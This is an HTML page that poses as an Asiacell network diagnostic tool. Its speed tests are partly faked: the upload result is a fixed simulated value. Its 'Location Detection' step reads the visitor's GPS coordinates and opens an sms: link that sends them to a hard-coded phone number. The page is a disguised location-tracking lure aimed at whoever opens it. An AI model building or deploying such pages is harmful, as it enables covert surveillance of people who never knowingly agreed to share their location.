<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Asiacell - Smart Network Diagnostic</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #b80000, #ffffff);
      color: #333;
      text-align: center;
      padding: 2em;
    }
    h1 {
      color: #fff;
      background-color: #b80000;
      padding: 15px;
      border-radius: 10px;
      display: inline-block;
    }
    button {
      font-size: 20px;
      padding: 15px 30px;
      background-color: #b80000;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background-color: #8a0000;
    }
    .test-container {
      margin-top: 40px;
    }
    .step {
      background: #fff;
      border-radius: 10px;
      margin: 20px auto;
      padding: 20px;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      position: relative;
    }
    .step .progress {
      width: 100%;
      height: 10px;
      background: #eee;
      border-radius: 5px;
      margin-top: 10px;
      overflow: hidden;
    }
    .step .bar {
      height: 100%;
      width: 0%;
      background: #b80000;
      transition: width 1s ease-in-out;
    }
    .result {
      font-weight: bold;
      font-size: 18px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>Network Diagnostic Tool</h1>
  <p>Click the button to start testing your connection</p>
  <button onclick="startTest()">Start Test</button>

  <div class="test-container" id="tests" style="display:none;">
    <div class="step">
      <div>Checking Network Type</div>
      <div class="progress"><div class="bar" id="bar1"></div></div>
      <div class="result" id="res1"></div>
    </div>
    <div class="step">
      <div>Download Speed Test</div>
      <div class="progress"><div class="bar" id="bar2"></div></div>
      <div class="result" id="res2"></div>
    </div>
    <div class="step">
      <div>Upload Speed Test</div>
      <div class="progress"><div class="bar" id="bar3"></div></div>
      <div class="result" id="res3"></div>
    </div>
    <div class="step">
      <div>Location Detection</div>
      <div class="progress"><div class="bar" id="bar4"></div></div>
      <div class="result" id="res4"></div>
    </div>
  </div>

  <script>
    async function startTest() {
      document.getElementById('tests').style.display = 'block';
      await runStep('bar1', 'res1', () => {
        let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return conn && conn.effectiveType ? `Type: ${conn.effectiveType}` : 'Unknown';
      });

      await runStep('bar2', 'res2', () => {
        return new Promise(resolve => {
          let start = new Date().getTime();
          let image = new Image();
          image.onload = () => {
            let end = new Date().getTime();
            let duration = (end - start) / 1000;
            let bitsLoaded = 500000 * 8; // 500KB image
            let speedMbps = (bitsLoaded / duration / 1024 / 1024).toFixed(2);
            resolve(`${speedMbps} Mbps`);
          };
          image.src = "https://upload.wikimedia.org/wikipedia/commons/3/3f/Fronalpstock_big.jpg?t=" + start;
        });
      });

      await runStep('bar3', 'res3', () => {
        return new Promise(resolve => {
          // Simulated Upload speed
          setTimeout(() => resolve('2.50 Mbps (simulated)'), 1500);
        });
      });

      await runStep('bar4', 'res4', () => {
        return new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            pos => {
              let coords = `Lat: ${pos.coords.latitude.toFixed(5)}, Long: ${pos.coords.longitude.toFixed(5)}`;
              resolve(coords);
              sendSMS(pos.coords.latitude, pos.coords.longitude);
            },
            err => resolve('Location not available')
          );
        });
      });
    }

    function runStep(barId, resId, testFn) {
      return new Promise(async (resolve) => {
        let bar = document.getElementById(barId);
        let result = document.getElementById(resId);
        bar.style.width = '100%';
        let value = await testFn();
        result.innerText = value;
        resolve();
      });
    }

    function sendSMS(lat, long) {
      const number = "+9647701180059";
      const body = encodeURIComponent(`Asiacell Diagnostic:\nLocation: ${lat}, ${long}`);
      const link = `sms:${number}?body=${body}`;
      window.location.href = link;
    }
  </script>
</body>
</html>
